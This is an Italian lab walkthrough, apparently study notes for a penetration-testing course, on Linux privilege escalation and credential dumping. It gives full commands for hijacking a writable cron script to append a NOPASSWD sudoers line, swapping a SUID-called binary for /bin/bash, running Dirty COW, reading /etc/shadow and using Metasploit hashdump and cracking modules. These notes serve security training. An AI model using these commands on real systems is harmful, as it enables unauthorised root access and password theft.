ATTENZIONE: Kernel Exploits non compatibili con la versione di kernel del target può comportare server crash, kernel panic e conseguente perdita di dati. Fare quindi molta attenzione ad eseguire Kernel exploits in ambienti di produzione o enterprise.
{% endhint %}

#### Local enumeration <a href="#local-enumeration" id="local-enumeration"></a>

Nel nostro laboratorio partiamo dalla situazione in cui abbiamo già ottenuto accesso al target tramite degli exploit e quindi facciamo come prima cosa un po' di local enumeration:sysinfogetuid​.

Come vediamo l'utente www-data non ha nessun permesso sudo per cui dobbiamo fare privilege escalation e puntiamo ovviamente a farla verso l'utente root.

#### Privesc con Linux Exploit Suggester tool <a href="#privesc-con-linux-exploit-suggester-tool" id="privesc-con-linux-exploit-suggester-tool"></a>

è uno shell script molto semplice da usare.

è suggerito scaricare LES sulla macchina attaccante e poi trasferirlo sulla vittima per eseguirlo.

In questo caso abbiamo una meterpreter shell quindi sarà più semplice:

```
cd /temp
ls
upload Desktop/Linux-Enum/les.sh
shell
ls -al
chmod +x les.sh
ls -alps
./les.sh
```

Eseguendo LES ci verranno mostrate una serie di exploits per i quali la nostra specifica versione del kernel è vulnerabile.

In particolare il pezzo più importante per fare kernel exploitation è contenuto nelle prima righe del risultato: Kernel version, Architecture, Distribution, Distribution version.

Gli exploit elencati all'inizio sono quelli con maggior probabilità di successo, tuttavia bisogn afare attenzione alla descrizione di ogni exploit per verificarne l'effettiva compatibilità, in particolare details, exposure e tags.

Verifichiamo il primo exploit che capita su exploit-db, ad es. _dirtycow_.

Le azioni da fare elencate nel commento del codice dell'exploit dirtycow sono:

* Compilare
* Eseguire il binary appena creato

#### Eseguire l'exploit (es. dirtycow)

1. Scarichiamo il programma scritto in C da Exploit Database
2. Carichiamo il codice C sulla macchina vittima
3. Compiliamo il codice C sulla macchina vittima
4. Eseguiamo il binario compilato, ossia l'exploit

Nel caso specifico di dirtycow è creato un nuovo utente a cui è possibile connettersi poi in SSH.

Per verificare se siamo utenti privilegiati proviamo a fare cat del file /etc/shadow.

### Exploiting Misconfigured Cron Jobs

Se il shell script nel cronjob può essere modificato da ogni utente, quindi è stato misconfigurato, allora possiamo modificare lo script nel cronjob e ottenere quindi l'esecuzione di comandi che vogliamo.

Per elevare i privilegi possiamo ad esempio connetterci ad un netcat listener oppure aggiungere un utente a cui abbiamo già accesso al file sudoers, in modo da poter poi eseguire task che richiedono root privileges senza inserire ulteriori password.

#### Fasi dell'exploiting

1. Identificare quali file/script sono usati da un cronjob
2. Identificare se quello shell script richiamato nel cronjob può essere modificato da un utente non privilegiato
3. modificare lo script inserendo un comando che aggiunga l'utente con il quale abbiamo accesso al file sudoers

#### Capire se l'utente con il quale abbiamo accesso alla vittima è nei sudoers

```
whoami
groups <nome utente>
cat /etc/shadown
```

#### Identificare i file con associati dei cron job

```
crontab -l //per verificare se abbiamo dei cron job con l'utente loggato
```

Dobbiamo cercare dei file che potrebbero essere coinvolti in cron job, come ad esempio un file con solo i permessi per l'utente root in una cartella dove l'utente è un altro, oppure dei file plausibili che non possiamo vedere o modificare come utenti normali (wuindi con permessi tipo _-rw-------_).

Per identificare dove questo file viene chiamato (e quindi probabilmente il file crontab dove è contenuto) possiamo cercare la stringa del path con l'utility grep. E trovare quindi uno script che chiami questo file. Se possiamo modificare lo script (se i permessi malconfigurati ce lo concedono), allora possiamo decidere di inserire righe di codice che eseguano azioni malevole a nostro favore (es. aggiungere il nostro utente ai sudoers).

```
ls -al
pd
cat message
cd /
grep -rnw /usr -e "/home/student/message"   //la cartella /usr è dove tipicamente troviamo degli shell script
// è presente un file /usr/local/share/copy.sh che fa una copia di questo file message in /tmp/
ls -al /tmp
cat /tmp/message
ls -al /usr/local/share/copy.sh //dato che è modificabile vogliamo inserire una riga di codice qui dentro, così da essere eseguita da crontab
cat /usr/local/share/copy.sh
```

Guardando il file script /usr/local/share/copy.sh vediamo che il file appartiene a root, ma i permessi sono settati per consentire lettura, modifica ed esecuzione a tutti gli utenti.\
Dato che è modificabile vogliamo inserire una riga di codice qui dentro, così da essere eseguita da crontab. Il cronjob associato non sappiamo quando verrà eseguito nella realtà. Ai fini del laboratorio viene eseguito ogni minuto ed è possibile vederlo dal fatto che il file di copia che abbiamo identificato in /tmp/message viene aggiornato ogni minuto.

#### Modificare il file script

In questo lab environment non abbiamo dei text editor installati, per cui dobbiamo trovare un modo ingegnoso di modificare il file, e lo faremo con **printf**:

```
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
sudo -l //Possiamo verificare gli utenti che sono parte di sudoers e vedere che la riga è stata aggiunta (dopo l'esecuzione del cron job)
sudo su //e funziona
whoami //root user
cd /root
ls
cat flag
```

Ciò che stiamo dicendo di fare è di fare un redirect dell'output "student ALL=NOPASSWD:ALL" nel file sudoers. \
Quella stringa significa che l'utente student dovrebbe avere ALL privileges e non ha bisogno di specificare la password.

### Exploiting SUID Binaries

#### Identificazione di un file con SUID permission

Sulla macchina target

```
whoami
groups student
pwd
ls -al
```

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nella home dell'utente ci sono due file: greetings e welcome. Welcome appartiene all'utente root ma possiamo eseguirlo dato che ci sono le x. Ma se poniamo attenzione alla s, quella s è l'SUID permission è applicata a questo file.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Static Analysis del file con SUID e delle chiamate per sfruttarlo

```
file welcome
strings welcome //notiamo una chiamata al binary greetings
```

#### Creazione o modifica del file chiamato dal programma con SUID per fare privilege escalation

```
rm greetings //eliminiamo il file greetings per sostituirlo
cp /bin/bash greetings
ls
./welcome
id
whoami
cat /etc/shadow
```

## Linux Credential Dumping

### Dumping Linux Password Hashes

* Tutte le password crittografate per gli utenti sono archiviate nel file shadow. Si trova nella seguente directory: `/etc/shadow`
* Il file shadow può essere acceduto e letto solo dall'account root, questa è una caratteristica di sicurezza molto importante in quanto impedisce ad altri account sul sistema di accedere alle password sottoposte ad hashing.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In Linux con l'hash delle password non possiamo farci molto se non craccarli per ottenere la password.

#### Se si ha già accesso alla vittima

```
cat /etc/shadow
```

#### Per aprire una sessione meterpreter dopo aver fatto accesso con exploit module MSF

```
exploit
/bin/bash -i
id
CTRL+Z -> background session? Y
sessions
sessions -u 1 // ci dà un errore ma crea comunque la sessione con meterpreter
sessions
sessions 2
sysinfo
```

#### hashdump: Modulo MSF alternativo per dumpare hash password

```
/etc/init.d/postgresql start & msfconsole
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 2 //la sessione che abbiamo già attiva a seguito dell'exploitation del servizio ProFTPD
run
```

Quello che questo modulo fa è identificare tutti gli utenti nel file /etc/shadow che hanno una password impostata e li salva in un file, in versione unshadowed. In poche parole viene salvata la password in un formato che può essere craccato.

### Password cracking from Hash

#### Per identificare vulnerabilità per un servizio trovato con nmap (es. ProFTPD 1.3.3c)

```
nmap --script vuln -p 21 demo.ine.local
```

#### Modulo MSF per dump hash credenziali vittima

Da utilizzare dopo aver ottenuto una sessione con un altro exploit MSF

```
use post/linux/gather/hashdump
set SESSION 1
exploit
```

#### Modulo MSF auxiliary per crackare l'hash delle password

```
use auxiliary/analyze/crack_linux
set SHA512 true
run
```
